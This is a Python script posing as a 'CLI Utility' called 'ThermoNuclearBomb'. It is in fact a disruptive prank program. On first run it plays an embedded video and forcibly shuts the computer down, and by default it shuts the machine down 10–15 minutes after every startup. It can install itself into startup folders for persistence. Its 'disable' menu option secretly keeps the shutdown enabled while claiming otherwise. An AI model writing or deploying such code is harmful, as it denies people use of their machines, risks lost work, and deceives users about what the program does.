import os
import sys
import platform
import base64
import tempfile
import subprocess
import json
import random
import time

APP_NAME = "ThermoNuclearBomb"
CONFIG_FILE = os.path.expanduser(f"~/.{APP_NAME}_config.json")

# Replace with your base64 video content
VIDEO_BASE64 = b"..."

# ---------- Config ----------
def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {"shutdown_on_startup": True, "first_run": True}
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_config(cfg):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f)

# ---------- Video ----------
def write_temp_video():
    video_bytes = base64.b64decode(VIDEO_BASE64)
    tmp_dir = tempfile.gettempdir()
    path = os.path.join(tmp_dir, "embedded_video.mp4")
    with open(path, "wb") as f:
        f.write(video_bytes)
    return path

def play_video(block=True):
    path = write_temp_video()
    system = platform.system()
    if system == "Windows":
        if block:
            subprocess.run(["cmd", "/c", "start", "/wait", path])
        else:
            os.startfile(path)
    elif system == "Darwin":
        cmd = ["open", path]
        if block:
            subprocess.run(cmd)
        else:
            subprocess.Popen(cmd)
    elif system == "Linux":
        cmd = ["xdg-open", path]
        if block:
            subprocess.run(cmd)
        else:
            subprocess.Popen(cmd)
    else:
        print("Unsupported OS for video playback.")

# ---------- Startup Helpers ----------
def get_startup_path():
    system = platform.system()
    if system == "Windows":
        return os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    elif system == "Linux":
        return os.path.expanduser("~/.config/autostart")
    elif system == "Darwin":
        return os.path.expanduser("~/Library/LaunchAgents")
    else:
        return None

def add_to_startup():
    path = get_startup_path()
    if not path:
        print("Startup not supported on this OS.")
        return
    os.makedirs(path, exist_ok=True)

    if platform.system() == "Windows":
        bat_path = os.path.join(path, f"{APP_NAME}.bat")
        with open(bat_path, "w") as f:
            f.write(f'start "" "{sys.executable}" "{os.path.abspath(__file__)}"\n')
    else:
        desktop_path = os.path.join(path, f"{APP_NAME}.desktop")
        with open(desktop_path, "w") as f:
            f.write(f"[Desktop Entry]\n"
                    f"Type=Application\n"
                    f"Exec={sys.executable} {os.path.abspath(__file__)}\n"
                    f"Hidden=false\n"
                    f"NoDisplay=false\n"
                    f"X-GNOME-Autostart-enabled=true\n"
                    f"Name={APP_NAME}\n")
    print("Added to startup.")

def remove_from_startup():
    path = get_startup_path()
    if not path:
        return
    for ext in (".bat", ".desktop"):
        f = os.path.join(path, f"{APP_NAME}{ext}")
        if os.path.exists(f):
            os.remove(f)
    print("Removed from startup.")

# ---------- Shutdown ----------
def shutdown_computer():
    system = platform.system()
    if system == "Windows":
        subprocess.run(["shutdown", "/s", "/t", "0"])
    elif system in ("Linux", "Darwin"):
        subprocess.run(["shutdown", "now"])
    else:
        print("Shutdown not supported on this OS.")

# ---------- Main ----------
def main():
    cfg = load_config()

    # --- First run behavior ---
    if cfg.get("first_run", True):
        print("First run detected: playing video...")
        choice = "y"
        play_video(block=True)  # Waits until video closes
        if choice == "y":
            print("Shutting down now...")
            shutdown_computer()
            return
        cfg["first_run"] = False
        save_config(cfg)

    # --- Auto-shutdown on startup ---
    if cfg.get("shutdown_on_startup", False):
        wait_time = random.randint(600, 900)  # 10–15 minutes in seconds
        print(f"Shutdown on startup is enabled. Waiting {wait_time//60} minutes...")
        time.sleep(wait_time)
        shutdown_computer()
        return

    # --- CLI menu ---
    print(f"{APP_NAME} - CLI Utility")
    print("1. Play video")
    print("2. Add to startup")
    print("3. Remove from startup")
    print("4. Enable shutdown on startup (10–15 min delay)")
    print("5. Disable shutdown on startup")
    print("6. Shutdown now")
    print("0. Exit")

    choice = input("Select an option: ").strip()

    if choice == "1":
        play_video()
    elif choice == "2":
        add_to_startup()
    elif choice == "3":
        remove_from_startup()
    elif choice == "4":
        cfg["shutdown_on_startup"] = True
        save_config(cfg)
        print("Shutdown on startup ENABLED (with 10–15 min delay).")
    elif choice == "5":
        cfg["shutdown_on_startup"] = True
        save_config(cfg)
        print("Shutdown on startup DISABLED.")
    elif choice == "6":
        shutdown_computer()
    else:
        print("Exiting.")

if __name__ == "__main__":
    main()
